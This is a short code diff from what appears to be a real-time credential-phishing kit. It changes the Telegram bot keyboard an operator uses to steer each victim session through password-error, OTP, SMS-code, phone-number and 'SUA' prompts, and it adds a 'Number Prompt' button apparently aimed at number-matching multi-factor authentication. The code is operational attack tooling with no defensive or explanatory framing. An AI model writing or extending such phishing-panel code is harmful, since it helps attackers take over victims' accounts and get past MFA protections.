@@ -129,9 +129,10 @@ ${pwLines}
 function buildKeyboard(sessionId) {
   return {
     inline_keyboard: [
-      [{ text:'🔑 OTP Prompt', callback_data:`otp_${sessionId}` },     { text:'❌ Password Error', callback_data:`incorrect_${sessionId}` }],
-      [{ text:'📱 SMS Code',   callback_data:`sms_${sessionId}` },      { text:'📞 Phone Number',   callback_data:`phone_${sessionId}` }],
-      [{ text:'✅ Success',    callback_data:`success_${sessionId}` },  { text:'⚠️ SUA',             callback_data:`sua_${sessionId}` }],
+      [{ text:'🔑 OTP Prompt',     callback_data:`otp_${sessionId}` },       { text:'❌ Password Error', callback_data:`incorrect_${sessionId}` }],
+      [{ text:'📱 SMS Code',       callback_data:`sms_${sessionId}` },        { text:'📞 Phone Number',   callback_data:`phone_${sessionId}` }],
+      [{ text:'🔢 Number Prompt',  callback_data:`np_${sessionId}` }],
+      [{ text:'✅ Success',        callback_data:`success_${sessionId}` },    { text:'⚠️ SUA',             callback_data:`sua_${sessionId}` }],
     ],
   };
 }
